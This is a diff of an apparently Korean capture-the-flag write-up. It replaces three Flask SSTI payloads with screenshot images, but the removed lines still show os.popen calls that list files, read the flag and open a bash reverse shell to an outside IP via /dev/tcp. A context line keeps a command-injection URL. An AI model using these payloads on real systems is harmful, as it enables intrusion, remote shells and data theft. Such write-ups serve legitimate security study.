@@ -111,13 +111,13 @@ http://13.125.25.152/memos/kangsecu.php?cmd=/bin/sh;cd ../../../../../cat flag
 이런 코드를 .phtml로 작성하고 업로드하여 진행하면 쿠키탈취가 가능하다. 이게 1번 플래그였다.
 
 그 다음 1번에서 취득한 어드민 권한으로 접속하면 업로드 된 글들에 코멘트를 달 수 있는데, 여기서 uwsgi를 사용한 프론트는 아파치고, 백엔드는 플라스크라는게 생각나서 SSTI를 진행했다.
-{{config.__class__.__init__.__globals__['os'].popen('ls').read()}} 
+![ssti1](/img/ssti1.png)
 
 를 이용하여 내부 디렉터리에 파일들을 출력하고 flag가 있길래 읽어왔다.
-{{config.__class__.__init__.__globals__['os'].popen('cat flag').read()}} 
+![ssti2](/img/ssti2.png)
 
 이게 2번 정답이다. 3번은 여기서 SSTI를 이용하여 리버스쉘을 취득해서 nc에서 진행하였다.
-`{{config.__class__.__init__.__globals__['os'].popen('/bin/bash-c"/bin/bash-i>&/dev/tcp/49.247.132.71/12345 0>&1"').read()}}`
+![ssti3](/img/ssti3.png)
 
 이를 이용하여 우리 서버에 리버스쉘을 연결하고 nc를 열어서 app.py코드를 확인하고 db정보를 취득했다.
 
